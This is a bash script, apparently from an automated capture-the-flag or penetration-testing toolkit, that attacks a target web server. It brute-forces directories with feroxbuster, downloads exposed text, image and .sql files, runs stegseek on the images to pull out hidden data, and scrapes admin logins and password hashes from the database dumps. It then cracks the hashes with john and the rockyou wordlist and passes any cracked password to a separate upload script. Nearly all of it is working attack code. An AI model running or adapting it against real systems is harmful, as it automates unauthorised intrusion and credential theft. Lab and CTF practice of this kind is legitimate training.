#!/bin/bash
path=$(cat path)
cd $path
port=$(cat port)
IP_address=$(cat IP_address)
machine=$(cat machine)
http_true=$(grep -c "http" scan_nmap_"$machine"_grep)
if [ $http_true -gt 0 ]
then
	echo -e "\n Starting feroxbuster on $machine"
	feroxbuster -u http://$IP_address --depth 5 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > feroxbuster_$machine
	cat feroxbuster_$machine
	urls=$(grep -Eo 'http://[^ ]*/$' feroxbuster_$machine)
	echo "URL : $urls"

	#Retrieves the contents of all web pages
	IFS=$'\n' read -rd '' -a url_array<<<$urls
	for url in ${url_array[@]}
	do
		page_content=$(curl -s $url)
		#Text files
		file_urls=$(echo "$page_content" | grep -oE "href=\"[^\"]+\.txt\"" | cut -d'"' -f2)
		echo -e "\n url of the downloading txt files availables on : $url"
		echo $file_urls
		IFS=$'\n' read -rd '' -a file_array <<< $file_urls
		for file in ${file_array[@]}
		do
			echo -e "\n Contenu de $file : "
			echo "------------------------------"
			curl -s $url$file
			echo "------------------------------"
		done



		image_file=$(echo "$page_content" | grep -oE "[^\"]*\.jpg")
		IFS=$'\n' read -rd '' -a image_array <<< $image_file
		for img in ${image_array[@]}
		do
			wget $url/$img
			echo -e "\n Downloading $img"
			jp2a --color --width=50 $img
			
            #Looking for steganography
            name=$(echo $img | cut -d "." -f1)
            stegseek $img 1>> stegseek_$name 2>&1
            name=$(grep "Extracting" stegseek_$name | grep -oE "[^\"]*\.out")
            if [ -n "$name" ]; then
                echo $name > name
                tr '\n' ' ' < $name | tr -s ' ' | awk '!a[$0]++' > tmp_wordlists_$machine
                tr 'A-Z' 'a-z' < tmp_wordlists_$machine >> wordlists_$machine
            else
                echo "no hidden files in the image"
            fi
		done
	done
    #Looking for sql files
    sqlfile=$(grep -Eo 'http://.*\.sql' feroxbuster_$machine)
    IFS=$'\n' read -rd '' -a sql_array<<<$sqlfile
    condition=$(echo "v")
    validator=$(echo "z")
    for sql in ${sql_array[@]}
    do
        wget $sql
        echo $sql > tempurl.txt
        filename=$(sed 's/.*\///' tempurl.txt)
        bdd=$(cat $filename)
        hashsql=$(echo $bdd | grep -Eo "passwd.*[a-f0-9]{20,}" | grep -oE "[a-f0-9]{20,}")
        if [ -n "$hashsql" ]; then
            echo $hashsql > hashsql.txt
        fi
        loginsql=$(echo $bdd | grep -oE "admin.*" | grep -oE '[^"]*' | head -n 6 | grep -oE '[^\\]*\\' | sed -n '5p' | sed 's/.$//')
        if [ -n "$loginsql" ]; then
            echo $loginsql > loginsql.txt
        fi
        IFS=$'\n' read -rd '' -a login_array<<<$(cat loginsql.txt)
        IFS=$'\n' read -rd '' -a hash_array<<<$(cat hashsql.txt)
        for login in ${login_array}
        do
            echo $login > login.txt
            for hash in ${hash_array}
            do
                cat login.txt
                echo $hash
                echo $hash > txt.$hash
                hash-identifier $(cat txt.$hash) > type_$hash &
                pid=$(echo $!)
                sleep 3
                kill -15 $pid
                grep -E -A 1 ^Possible type_$hash | grep -o '[+].*' | cut -d " " -f2 > type.txt
                echo "test"
                john --format=raw-$(cat type.txt) --wordlist=/usr/share/wordlists/rockyou.txt txt.$hash
                john --show --format=raw-$(cat type.txt) txt.$hash > mdptemp.txt
                grep -E "?:" mdptemp.txt | cut -d ":" -f2 > mdp.txt
                validator=$(cat mdp.txt)
                if [[ $condition != $validator ]]; then
                    cd ..
                    bash upload.sh
                    cd $path
                fi
                condition=$validator
            done
        done
    done
fi
